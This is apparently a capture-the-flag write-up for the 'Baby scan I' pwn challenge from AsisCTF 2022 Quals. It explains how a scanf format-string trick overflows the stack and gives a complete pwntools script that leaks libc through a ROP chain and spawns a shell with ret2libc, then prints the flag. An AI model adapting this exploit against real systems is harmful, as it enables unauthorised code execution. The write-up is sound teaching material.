---
title: "[Pwn] Baby scan I [AsisCTF 2022 Qual]"
date: 2022-10-15 20:53:00
---

# 0x0 Introduction

Baby scan I

Is it possible to scan the thousands of resulting strings by hand? We think it’s tedious, but will get the job done!

nc 65.21.255.31 13370

files: [babyscan_1](babyscan_1_12c5d902584e857a4f680aa1575d2fd81e08ec03.txz)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerbility

The source code is given

```
int main() {
  char size[16], fmt[8], *buf;

  printf("size: ");
  scanf("%15s", size);
  if (!isdigit(*size)) {
    puts("[-] Invalid number");
    return 1;
  }
  buf = (char*)alloca(atoi(size) + 1);

  snprintf(fmt, sizeof(fmt), "%%%ss", size);
  scanf(fmt, buf);

  return 0;
}
```

We can see that `isdigit` only take the first character of our input. We can bypass this check using any string start with a number.

This function also use `alloca`, `alloca` will allocate a space on top of the current stack address. 

Since the binary doesn't enable canary, if we can perform a buffer overflow on the code, we can control the rip and do a rop chain.

luckily, `scanf` give us an opportunity to do that. if we use `%s` in `scanf`, `scanf` will scan all the characters until some special character (such as `\n`, space) appear. This give us a chance to input a payload with any length and overwrite rest of the stack.

Finally payload is `1$s`, 1 is used for bypass the check. and the final format string will be `%1$ss`. This give us the ability to overwrite whole stack.

Then, we can construct a ROP chain to leak libc address and perform ret2libc attack.


# 0x3 Exploit

```python
from pwn import *

exe = ELF("chall")
exe_rop = ROP(exe)
if args.LOCAL:
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
else:
    libc = ELF("libc.so.6")
# ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def log_print(*msg):
    log.info(" ".join(map(str,msg)))
lp = log_print
def start():
    if args.LOCAL:
        
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("65.21.255.31", 13370)
    return r


io = start()
ret_addr = exe_rop.find_gadget(['ret'])[0]
pop_rdi_ret_addr = exe_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15_ret_addr = exe_rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
io.sendlineafter(b"size: ",b"1$s")
io.sendlineafter(b"data: ",flat({
    0x8*8: 0x0000000000404d00,
    0x8*9: [
        pop_rdi_ret_addr,
        exe.got["puts"],
        exe.sym["puts"],
        exe.sym["main"],
    ]
}))
libc.address = int.from_bytes(io.recvuntil(b"\n",drop=True),"little")- libc.sym["puts"]
lp("libc base",hex(libc.address))
io.sendlineafter(b"size: ",b"1$s")
io.sendlineafter(b"data: ",flat({
    0x8*9: [
        ret_addr,
        pop_rdi_ret_addr,
        next(libc.search(b"/bin/sh")),
        libc.sym["system"],
    ]
}))
io.interactive()

```

# 0x4 Flag

ASIS{06e5ff13b438f5d6626a97758fddde3e502fe3fc}